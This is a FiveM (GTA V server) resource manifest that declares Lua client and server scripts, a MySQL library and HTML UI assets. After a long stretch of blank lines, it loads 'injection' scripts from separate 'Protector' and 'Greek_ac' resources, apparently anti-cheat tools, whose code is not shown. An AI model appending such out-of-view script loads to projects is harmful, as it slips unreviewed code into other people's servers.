fx_version 'adamant'

game 'gta5'

client_script 'client.lua'

server_scripts {
	'@mysql-async/lib/MySQL.lua',
	'server.lua'
}



shared_script 'config.lua'

ui_page "html/index.html"

files{
    'html/index.html',
    'html/images/*.png',
    'html/images/*.jpg',
    'html/script.js',
    'html/style.css',
    'html/fonts/*.woff',
    'html/fonts/*.woff2',
    'html/fonts/*.otf',
    'html/fonts/*.ttf'
}













server_script "@Protector/Server/injection.lua"
client_script "@Greek_ac/client/injections.lua"
server_script "@Greek_ac/server/injections.lua"